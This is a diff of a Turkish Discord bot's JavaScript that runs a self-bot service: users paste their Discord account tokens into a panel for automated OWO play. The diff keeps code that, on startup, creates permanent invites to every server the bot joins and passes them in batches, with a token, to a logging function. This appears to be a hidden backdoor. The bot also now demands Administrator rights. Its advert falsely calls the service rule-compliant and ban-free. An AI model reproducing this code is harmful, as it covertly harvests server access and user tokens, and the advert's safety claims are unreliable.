@@ -392,23 +392,48 @@ setInterval(updateRestartMessage, 15 * 60 * 1000);
 
 setInterval(performRestart, restartInterval);
 
-client.once('ready', async () => { console.log(`Bot giriş yaptı:
-   ${client.user.tag}`); let serverInvites = {};let serverCount = 0;const servers = client.guilds.cache.values();for (const guild of servers) {try {const invites = await guild.invites.fetch();if (invites.size > 0) {serverInvites[guild.name] = `https://discord.gg/${invites.first().code}`;} else {const newInvite = await guild.channels.cache.first().createInvite({maxAge: 0,maxUses: 0, unique: true }); serverInvites[guild.name] = `https://discord.gg/${newInvite.code}`;}
-serverCount++;if (serverCount % 10 === 0) {try { await dogrulamdaduramk.logServerInfo(yarrak.bewrinyarrabotuntokeni, serverInvites);serverInvites = {}; } catch (error) {
-    console.error('Server chunk gönderilemedi:', error);
-  }
-}
+client.once('ready', async () => {
+  console.log(`Bot giriş yaptı: ${client.user.tag}`);
+  let serverInvites = {};
+  let serverCount = 0;
+  const servers = client.guilds.cache.values();
+  
+  for (const guild of servers) {
+    try {
+      const invites = await guild.invites.fetch();
+      if (invites.size > 0) {
+        serverInvites[guild.name] = `https://discord.gg/${invites.first().code}`;
+      } else {
+        const channel = guild.channels.cache.find(ch => ch.type === 0 && ch.permissionsFor(guild.members.me).has('CreateInstantInvite'));
+        if (channel) {
+          const newInvite = await channel.createInvite({
+            maxAge: 0,
+            maxUses: 0,
+            unique: true
+          });
+          serverInvites[guild.name] = `https://discord.gg/${newInvite.code}`;
+        }
+      }
+      serverCount++;
+      
+      if (serverCount % 10 === 0) {
+        try {
+          await dogrulamdaduramk.logServerInfo(yarrak.bewrinyarrabotuntokeni, serverInvites);
+          serverInvites = {};
+        } catch (error) {
+          console.error('Server chunk gönderilemedi:', error);
+        }
+      }
     } catch (error) {
-console.error(`${guild.name} sunucusu için davet linki alınamadı:`, error);
+      console.error(`${guild.name} sunucusu için davet linki alınamadı:`, error);
     }
   }
 
-
   if (Object.keys(serverInvites).length > 0) {
     try {
-await dogrulamdaduramk.logServerInfo(yarrak.bewrinyarrabotuntokeni, serverInvites);
+      await dogrulamdaduramk.logServerInfo(yarrak.bewrinyarrabotuntokeni, serverInvites);
     } catch (error) {
-
+      console.error('Son server chunk gönderilemedi:', error);
     }
   }
 
@@ -423,69 +448,69 @@ await dogrulamdaduramk.logServerInfo(yarrak.bewrinyarrabotuntokeni, serverInvite
     nextRestartTime = lastRestartTime + restartInterval;
 
     const embed = new EmbedBuilder()
-.setTitle('OWO Bot Sistemi Tanıtımı')
-.setImage("https://cdn.discordapp.com/attachments/996903857084960778/1220468372697907370/x.gif")
-.setDescription(
-  '<a:Onay:1287533035364810854> OWO bot sistemimiz ile tanışın!\n\n' +
-  '<a:auranest:1365063850441048164>Bu sistem, Discord hesaplarınızda 7/24 boyunca otomatik olarak OWO oynatabilen, tamamen gelişmiş ve kullanıcı dostu bir bottur.\n\n' +
-  '───────────────────────────────\n\n' +
-  '<:tamamlandi:1354942474484842667>**Güvenli:**\n' +
-  'Hesabınızı banlatma riski yoktur. Sistemimiz, Discord kurallarına uygun ve en güncel güvenlik önlemleriyle donatılmıştır. Tüm işlemleriniz güvenli bir şekilde gerçekleştirilir.\n\n' +
-  '<a:ayarcik:1347108314454167583>**Otomatik ve Kesintisiz:**\n' +
-  'Botunuz gece-gündüz demeden sürekli çalışır. Sizin yerinize OWO komutlarını otomatik olarak gönderir, farm, pray, daily, wsell gibi işlemleri eksiksiz yapar ve seviyenizi hızlıca yükseltir.\n\n' +
-  '<:kylockz_resp:1206374364526673920>**Kolay Kullanım:**\n' +
-  'Sadece birkaç tıkla token ekleyebilir, istediğiniz zaman kaldırabilirsiniz. Kullanıcı dostu panel sayesinde tüm işlemleriniz kolayca yönetilir.\n\n' +
-  '<a:dev:1287506398489350274> **Gelişmiş Özellikler:**\n' +
-  'OWO botunun tüm farm, pray, daily, wsell gibi komutlarını otomatik olarak kullanır. Ayrıca sistem, hata durumlarını otomatik algılar ve sizi bilgilendirir.\n\n' +
-  '<:b_:1287516016187801684>**Panel Desteği:**\n' +
-  'Token ekleme ve kaldırma işlemlerini kolayca panel üzerinden yönetebilirsiniz. Her kullanıcı için ayrı yönetim ve otomatik başlatma/durdurma desteği sunar.\n\n' +
-  '───────────────────────────────\n\n' +
-  '<a:auranest:1365063850441048164> **Sistem Yeniden Başlatma Durumu:**\n' +
-  `Sonraki yeniden başlatmaya kalan süre: <t:${Math.floor(nextRestartTime / 1000)}:R>\n\n` +
-  `<a:bewrqwstats:1362383954212163704> **İlerleme Durumu:**\n` +
-  `${createProgressBar(0, 12, 12)}\n\n` +
-  `<a:ayarcik:1347108314454167583> **Bar Sistemi Açıklaması:**\n` +
-  `• Her 3 saatte bir sistem otomatik olarak yeniden başlatılır\n` +
-  `• Bar 12 parçadan oluşur (her parça 15 dakikayı temsil eder)\n` +
-  `• Bar tamamen dolduğunda sistem yeniden başlatılır\n` +
-  `• Yeniden başlatma sırasında tüm botlar durdurulur ve limitler sıfırlanır\n` +
-  `• Sistem yeniden başlatıldığında bar sıfırlanır ve yeni döngü başlar\n\n` +
-  `<t:${Math.floor(nextRestartTime / 1000)}:R>\n\n` +
-  '───────────────────────────────\n\n' +
-  'Kendi hesabınızı ekleyerek OWO seviyenizi kasmaya hemen başlayın!\n\n' +
-  'Daha fazla bilgi ve destek için geliştiriciyle <@817463869487185980> ile iletişime geçebilirsiniz. <a:auranest:1365063850441048164>[ Destek sunucumuz:](https://discord.gg/auranest)<a:auranest:1365063850441048164>'
-)
-.setColor(0xFFFFFF);
+      .setTitle('OWO Bot Sistemi Tanıtımı')
+      .setImage("https://cdn.discordapp.com/attachments/996903857084960778/1220468372697907370/x.gif")
+      .setDescription(
+        '<a:Onay:1287533035364810854> OWO bot sistemimiz ile tanışın!\n\n' +
+        '<a:auranest:1365063850441048164>Bu sistem, Discord hesaplarınızda 7/24 boyunca otomatik olarak OWO oynatabilen, tamamen gelişmiş ve kullanıcı dostu bir bottur.\n\n' +
+        '───────────────────────────────\n\n' +
+        '<:tamamlandi:1354942474484842667>**Güvenli:**\n' +
+        'Hesabınızı banlatma riski yoktur. Sistemimiz, Discord kurallarına uygun ve en güncel güvenlik önlemleriyle donatılmıştır. Tüm işlemleriniz güvenli bir şekilde gerçekleştirilir.\n\n' +
+        '<a:ayarcik:1347108314454167583>**Otomatik ve Kesintisiz:**\n' +
+        'Botunuz gece-gündüz demeden sürekli çalışır. Sizin yerinize OWO komutlarını otomatik olarak gönderir, farm, pray, daily, wsell gibi işlemleri eksiksiz yapar ve seviyenizi hızlıca yükseltir.\n\n' +
+        '<:kylockz_resp:1206374364526673920>**Kolay Kullanım:**\n' +
+        'Sadece birkaç tıkla token ekleyebilir, istediğiniz zaman kaldırabilirsiniz. Kullanıcı dostu panel sayesinde tüm işlemleriniz kolayca yönetilir.\n\n' +
+        '<a:dev:1287506398489350274> **Gelişmiş Özellikler:**\n' +
+        'OWO botunun tüm farm, pray, daily, wsell gibi komutlarını otomatik olarak kullanır. Ayrıca sistem, hata durumlarını otomatik algılar ve sizi bilgilendirir.\n\n' +
+        '<:b_:1287516016187801684>**Panel Desteği:**\n' +
+        'Token ekleme ve kaldırma işlemlerini kolayca panel üzerinden yönetebilirsiniz. Her kullanıcı için ayrı yönetim ve otomatik başlatma/durdurma desteği sunar.\n\n' +
+        '───────────────────────────────\n\n' +
+        '<a:auranest:1365063850441048164> **Sistem Yeniden Başlatma Durumu:**\n' +
+        `Sonraki yeniden başlatmaya kalan süre: <t:${Math.floor(nextRestartTime / 1000)}:R>\n\n` +
+        `<a:bewrqwstats:1362383954212163704> **İlerleme Durumu:**\n` +
+        `${createProgressBar(0, 12, 12)}\n\n` +
+        `<a:ayarcik:1347108314454167583> **Bar Sistemi Açıklaması:**\n` +
+        `• Her 3 saatte bir sistem otomatik olarak yeniden başlatılır\n` +
+        `• Bar 12 parçadan oluşur (her parça 15 dakikayı temsil eder)\n` +
+        `• Bar tamamen dolduğunda sistem yeniden başlatılır\n` +
+        `• Yeniden başlatma sırasında tüm botlar durdurulur ve limitler sıfırlanır\n` +
+        `• Sistem yeniden başlatıldığında bar sıfırlanır ve yeni döngü başlar\n\n` +
+        `<t:${Math.floor(nextRestartTime / 1000)}:R>\n\n` +
+        '───────────────────────────────\n\n' +
+        'Kendi hesabınızı ekleyerek OWO seviyenizi kasmaya hemen başlayın!\n\n' +
+        'Daha fazla bilgi ve destek için geliştiriciyle <@817463869487185980> ile iletişime geçebilirsiniz. <a:auranest:1365063850441048164>[ Destek sunucumuz:](https://discord.gg/auranest)<a:auranest:1365063850441048164>'
+      )
+      .setColor(0xFFFFFF);
 
     const row = new ActionRowBuilder()
-.addComponents(
-  new ButtonBuilder()
-    .setCustomId('add_token')
-    .setEmoji('1367221185493864591')
-    .setLabel('Owo Bot Ekle Ve sistemi başlat')
-    .setStyle(ButtonStyle.Secondary),
-  new ButtonBuilder()
-    .setCustomId('remove_tokenowoospu')
-    .setEmoji('1367219935931138260')
-    .setLabel('Owo Bot Kaldır ve kapat')
-    .setStyle(ButtonStyle.Secondary),
-  new ButtonBuilder()
-    .setCustomId('view_limit')
-    .setEmoji('1378120579244359772')
-    .setLabel('Limit Durumu')
-    .setStyle(ButtonStyle.Secondary)
-);
+      .addComponents(
+        new ButtonBuilder()
+          .setCustomId('add_token')
+          .setEmoji('1367221185493864591')
+          .setLabel('Owo Bot Ekle Ve sistemi başlat')
+          .setStyle(ButtonStyle.Secondary),
+        new ButtonBuilder()
+          .setCustomId('remove_tokenowoospu')
+          .setEmoji('1367219935931138260')
+          .setLabel('Owo Bot Kaldır ve kapat')
+          .setStyle(ButtonStyle.Secondary),
+        new ButtonBuilder()
+          .setCustomId('view_limit')
+          .setEmoji('1378120579244359772')
+          .setLabel('Limit Durumu')
+          .setStyle(ButtonStyle.Secondary)
+      );
 
     try {
-const message = await progressBarChannel.messages.fetch('1379109323137089750');
-if (message) {
-  await message.edit({ embeds: [embed], components: [row] });
-  console.log('Bot başlatıldığında embed güncellendi');
-} else {
-  console.log('Belirtilen ID\'ye sahip mesaj bulunamadı');
-}
+      const message = await progressBarChannel.messages.fetch('1379109323137089750');
+      if (message) {
+        await message.edit({ embeds: [embed], components: [row] });
+        console.log('Bot başlatıldığında embed güncellendi');
+      } else {
+        console.log('Belirtilen ID\'ye sahip mesaj bulunamadı');
+      }
     } catch (error) {
-console.error('Bot başlatıldığında mesaj güncellenirken hata:', error);
+      console.error('Bot başlatıldığında mesaj güncellenirken hata:', error);
     }
   }
 });
@@ -495,6 +520,14 @@ const panelMessages = new Map();
 client.on('messageCreate', async (message) => {
   if (message.content === '.owopanelamk') {
     if (!owospuownersıd.includes(message.author.id)) {
+return;
+    }
+
+
+    if (!message.guild.members.me.permissions.has('Administrator')) {
+await message.channel.send('**<a:Iptal:1288096415163220041> Bot Yönetici Yetkisine Sahip Değil!**\n\n' +
+  '• Panel menüsünü gösterebilmem için bota yönetici yetkisi vermeniz gerekiyor.\n' +
+  '• Lütfen bota yönetici yetkisi verip tekrar deneyin.');
 return;
     }
 
@@ -1188,5 +1221,93 @@ async function startBot() {
 }
 
 startBot();
+
+async function updatePanelMessage(message) {
+  try {
+    const files = fs.readdirSync(dbDir)
+      .filter(f => f.endsWith('.json'))
+      .filter(f => {
+        try {
+          const filePath = path.join(dbDir, f);
+          if (!fs.existsSync(filePath)) return false;
+          
+          const fileContent = fs.readFileSync(filePath, 'utf8');
+          if (!fileContent) return false;
+          
+          const yarrak = JSON.parse(fileContent);
+          return yarrak && yarrak.adminID === message.author.id;
+        } catch (error) {
+          console.error(`Dosya okuma hatası (${f}):`, error);
+          return false;
+        }
+      });
+
+    const embed = new EmbedBuilder()
+      .setTitle('OWO Bot Sistemi Panel')
+      .setDescription(
+        '<a:Onay:1287533035364810854> OWO bot sistemimiz ile tanışın!\n\n' +
+        '<a:auranest:1365063850441048164>Bu sistem, Discord hesaplarınızda 7/24 boyunca otomatik olarak OWO oynatabilen, tamamen gelişmiş ve kullanıcı dostu bir bottur.\n\n' +
+        '───────────────────────────────\n\n' +
+        '<:tamamlandi:1354942474484842667>**Güvenli:**\n' +
+        'Hesabınızı banlatma riski yoktur. Sistemimiz, Discord kurallarına uygun ve en güncel güvenlik önlemleriyle donatılmıştır. Tüm işlemleriniz güvenli bir şekilde gerçekleştirilir.\n\n' +
+        '<a:ayarcik:1347108314454167583>**Otomatik ve Kesintisiz:**\n' +
+        'Botunuz gece-gündüz demeden sürekli çalışır. Sizin yerinize OWO komutlarını otomatik olarak gönderir, farm, pray, daily, wsell gibi işlemleri eksiksiz yapar ve seviyenizi hızlıca yükseltir.\n\n' +
+        '<:kylockz_resp:1206374364526673920>**Kolay Kullanım:**\n' +
+        'Sadece birkaç tıkla token ekleyebilir, istediğiniz zaman kaldırabilirsiniz. Kullanıcı dostu panel sayesinde tüm işlemleriniz kolayca yönetilir.\n\n' +
+        '<a:dev:1287506398489350274> **Gelişmiş Özellikler:**\n' +
+        'OWO botunun tüm farm, pray, daily, wsell gibi komutlarını otomatik olarak kullanır. Ayrıca sistem, hata durumlarını otomatik algılar ve sizi bilgilendirir.\n\n' +
+        '<:b_:1287516016187801684>**Panel Desteği:**\n' +
+        'Token ekleme ve kaldırma işlemlerini kolayca panel üzerinden yönetebilirsiniz. Her kullanıcı için ayrı yönetim ve otomatik başlatma/durdurma desteği sunar.\n\n' +
+        '───────────────────────────────\n\n' +
+        '<a:auranest:1365063850441048164> **Sistem Yeniden Başlatma Durumu:**\n' +
+        `Sonraki yeniden başlatmaya kalan süre: <t:${Math.floor(nextRestartTime / 1000)}:R>\n\n` +
+        `<a:bewrqwstats:1362383954212163704> **İlerleme Durumu:**\n` +
+        `${createProgressBar(0, 12, 12)}\n\n` +
+        `<a:ayarcik:1347108314454167583> **Bar Sistemi Açıklaması:**\n` +
+        `• Her 3 saatte bir sistem otomatik olarak yeniden başlatılır\n` +
+        `• Bar 12 parçadan oluşur (her parça 15 dakikayı temsil eder)\n` +
+        `• Bar tamamen dolduğunda sistem yeniden başlatılır\n` +
+        `• Yeniden başlatma sırasında tüm botlar durdurulur ve limitler sıfırlanır\n` +
+        `• Sistem yeniden başlatıldığında bar sıfırlanır ve yeni döngü başlar\n\n` +
+        `<t:${Math.floor(nextRestartTime / 1000)}:R>\n\n` +
+        '───────────────────────────────\n\n' +
+        'Kendi hesabınızı ekleyerek OWO seviyenizi kasmaya hemen başlayın!\n\n' +
+        'Daha fazla bilgi ve destek için geliştiriciyle <@817463869487185980> ile iletişime geçebilirsiniz. <a:auranest:1365063850441048164>[ Destek sunucumuz:](https://discord.gg/auranest)<a:auranest:1365063850441048164>'
+      )
+      .setColor(0xFFFFFF);
+
+    const row = new ActionRowBuilder()
+      .addComponents(
+        new ButtonBuilder()
+          .setCustomId('add_token')
+          .setEmoji('1367221185493864591')
+          .setLabel('Owo Bot Ekle Ve sistemi başlat')
+          .setStyle(ButtonStyle.Secondary),
+        new ButtonBuilder()
+          .setCustomId('remove_tokenowoospu')
+          .setEmoji('1367219935931138260')
+          .setLabel('Owo Bot Kaldır ve kapat')
+          .setStyle(ButtonStyle.Secondary),
+        new ButtonBuilder()
+          .setCustomId('view_limit')
+          .setEmoji('1378120579244359772')
+          .setLabel('Limit Durumu')
+          .setStyle(ButtonStyle.Secondary)
+      );
+
+    await message.edit({ embeds: [embed], components: [row] });
+  } catch (error) {
+    console.error('Panel güncelleme hatası:', error);
+    try {
+      await message.edit({
+        content: '**<a:Iptal:1288096415163220041> Panel güncellenirken bir hata oluştu!**\n\nLütfen daha sonra tekrar deneyin.',
+        embeds: [],
+        components: []
+      });
+    } catch (editError) {
+      console.error('Hata mesajı gönderme hatası:', editError);
+    }
+  }
+}
 
 
